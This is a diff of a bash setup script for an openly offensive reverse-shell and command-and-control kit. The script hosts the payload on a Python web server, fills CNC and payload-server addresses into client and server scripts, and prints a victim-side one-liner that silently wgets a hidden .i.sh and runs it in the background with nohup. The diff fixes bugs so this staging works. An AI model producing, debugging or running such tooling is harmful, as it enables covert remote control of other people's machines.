@@ -78,21 +78,21 @@ PAYLOAD_PORT=$(echo ${PAYLOAD_SERVER} | sed 's/^.*://')
 [[ "${PAYLOAD_HOST}" == "${CNC_HOST}" ]] && echo "Do you want to start a simple web server using python to host your reverse shell payload? (Y/N)" && read -p "Default (Y): " START_PYTHON_SERVER
 
 # Start server if requested
-[[ "${START_PYTHON_SERVER,,}" == 'y' ]] && python3 -m http.server ${PAYLOAD_PORT} &> /dev/null & 
+[[ "${START_PYTHON_SERVER,,}" != 'n' ]] && python3 -m http.server ${PAYLOAD_PORT} &> /dev/null & 
 
 # Verify if server is running
 SERVER_PID=$(ps aux | grep 'python3 -m http.server 8080' | egrep -v 'grep' | awk '{ print $2 }')
 [[ "${SERVER_PID}" -gt 0 ]] &&  printf "\nPython web server started on port ${PAYLOAD_PORT}\n\n" 
 
 # Replace scripts with proper details
-sed -i -e "s/<cnc_ip>/${CNC_HOST}/g" -e "s/<cnc_port>/${CNC_PORT}/g" -e "s/<payload_server_ip>/${PAYLOAD_HOST}/g" -e "s/<payload_server_port>/${PAYLOAD_PORT}/g" client_connect.sh >  &> /dev/null
+sed -i -e "s/<cnc_ip>/${CNC_HOST}/g" -e "s/<cnc_port>/${CNC_PORT}/g" -e "s/<payload_server_ip>/${PAYLOAD_HOST}/g" -e "s/<payload_server_port>/${PAYLOAD_PORT}/g" client_connect.sh  &> /dev/null
 sed -i -e "s/<cnc_ip>/${CNC_HOST}/g" -e "s/<cnc_port>/${CNC_PORT}/g" -e "s/<payload_server_ip>/${PAYLOAD_HOST}/g" -e "s/<payload_server_port>/${PAYLOAD_PORT}/g" client_payload.py &> /dev/null
 sed -i -e "s/<cnc_ip>/${CNC_HOST}/g" -e "s/<cnc_port>/${CNC_PORT}/g" -e "s/<payload_server_ip>/${PAYLOAD_HOST}/g" -e "s/<payload_server_port>/${PAYLOAD_PORT}/g" server_shell.py  &> /dev/null
 
 
 
 echo "[ON CNC SERVER] python3 final_server.pl"
-echo "[ON CLIENT] { wget -q -O .i.sh ${PAYLOAD_HOST}:${PAYLOAD_PORT}/final_connect.sh ; } && { nohup bash .i.sh &> /dev/null & }"
+echo "[ON CLIENT] { wget -q -O .i.sh ${PAYLOAD_HOST}:${PAYLOAD_PORT}/client_connect.sh ; } && { nohup bash .i.sh &> /dev/null & }"
 
 
 
